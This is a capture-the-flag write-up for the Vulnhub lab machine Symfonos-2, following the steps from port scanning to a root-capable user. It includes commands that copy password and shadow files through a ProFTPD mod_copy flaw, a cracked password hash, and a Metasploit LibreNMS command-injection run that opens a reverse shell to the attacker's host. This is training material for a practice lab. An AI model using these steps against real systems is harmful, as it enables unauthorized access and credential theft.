# Symfonos-2

Author: Vulnhub
Difficulty: 3
Key takeaway: You can copy files from FTP to smb share even if login was unsuccessful
Tags: FTP, SMB
Type: Linux

# Enumeration

- portscan

```bash
nmap -p22,21,139,80,445 -sV -sC -T4 -Pn -oA 10.0.2.5 10.0.2.5
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-28 15:35 EDT
Nmap scan report for 10.0.2.5
Host is up (0.00064s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         ProFTPD 1.3.5
22/tcp  open  ssh         OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 9d:f8:5f:87:20:e5:8c:fa:68:47:7d:71:62:08:ad:b9 (RSA)
|   256 04:2a:bb:06:56:ea:d1:93:1c:d2:78:0a:00:46:9d:85 (ECDSA)                                                                                                                                                                              
|_  256 28:ad:ac:dc:7e:2a:1c:f6:4c:6b:47:f2:d6:22:5b:52 (ED25519)                                                                                                                                                                            
80/tcp  open  http        WebFS httpd 1.21                                                                                                                                                                                                   
|_http-server-header: webfs/1.21                                                                                                                                                                                                             
|_http-title: Site doesn't have a title (text/html).                                                                                                                                                                                         
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                                                        
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian (workgroup: WORKGROUP)                                                                                                                                                                    
Service Info: Host: SYMFONOS2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                                                                                                                                              
                                                                                                                                                                                                                                             
Host script results:                                                                                                                                                                                                                         
|_clock-skew: mean: -3h49m57s, deviation: 2h53m12s, median: -5h29m58s                                                                                                                                                                        
|_nbstat: NetBIOS name: SYMFONOS2, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)                                                                                                                                                 
| smb-os-discovery:                                                                                                                                                                                                                          
|   OS: Windows 6.1 (Samba 4.5.16-Debian)                                                                                                                                                                                                    
|   Computer name: symfonos2                                                                                                                                                                                                                 
|   NetBIOS computer name: SYMFONOS2\x00                                                                                                                                                                                                     
|   Domain name: \x00                                                                                                                                                                                                                        
|   FQDN: symfonos2                                                                                                                                                                                                                          
|_  System time: 2021-09-28T09:06:11-05:00                                                                                                                                                                                                   
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-28T14:06:11
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
```

smb enumeration

```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\aeolus (Local User)
S-1-22-1-1001 Unix User\cronus (Local User)
```

# Initial Access

Found this inside log.txt file obtained from smb server

```bash
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
#
# Sample configuration file for the Samba suite for Debian GNU/Linux.
#
#
# This is the main Samba configuration file. You shou
```

copied files from ftp server to user smbshare 

```bash
ftp 10.0.2.5
# even if I can't login, I can still copy files from FTP to smb
> site cpfr /etc/passwd
> site cpto /home/aeolus/share/passwd
# similarly for shadow.bak 
```

cracked hash for aeolus

```bash
$6$dgjUjE.Y$G.dJZCM8.zKmJc9t4iiK9d723/bQ5kE1ux7ucBoAgOsTbaKmp.0iCljaobCntN3nCxsk4DLMy0qTn8ODPlmLG.:sergioteamo
```

# Privilege Escalation

```bash
You have mail in /var/mail/aeolus
```

using metasploit to add host using sql injection

```bash
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > show options

Module options (exploit/linux/http/librenms_addhost_cmd_inject):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD   sergioteamo      yes       Password for LibreNMS
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     localhost        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wi
                                         ki/Using-Metasploit
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base LibreNMS path
   USERNAME   aeolus           yes       User name for LibreNMS
   VHOST                       no        HTTP server virtual host

Payload options (cmd/unix/reverse):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Linux

msf6 exploit(linux/http/librenms_addhost_cmd_inject) > run 
[*] Exploiting target 0.0.0.1

[*] Started reverse TCP double handler on 10.0.2.15:4444 
sessuio[-] Exploit aborted due to failure: not-found: Failed to access the login page
[*] Exploiting target 127.0.0.1
n[*] Started reverse TCP double handler on 10.0.2.15:4444 
[*] Successfully logged into LibreNMS. Storing credentials...
[+] Successfully added device with hostname jdZRLqyofPJ
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo FGcEgOWVFQeFzneR;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket A
[*] A: "FGcEgOWVFQeFzneR\r\n"
[*] Matching...
[*] B is input...
[+] Successfully deleted device with hostname jdZRLqyofPJ and id #1
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.5:36256) at 2021-09-28 19:29:08 -0400
[*] Session 1 created in the background.
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > session -i 1
[-] Unknown command: session
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > session 
[-] Unknown command: session
msf6 exploit(linux/http/librenms_addhost_cmd_inject) > sessions 1
[*] Starting interaction with 1...

whoami
cronus
```

```bash
cronus@symfonos2:/$ sudo -l
sudo -l
Matching Defaults entries for cronus on symfonos2:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cronus may run the following commands on symfonos2:
    (root) NOPASSWD: /usr/bin/mysql
```

# Notes

-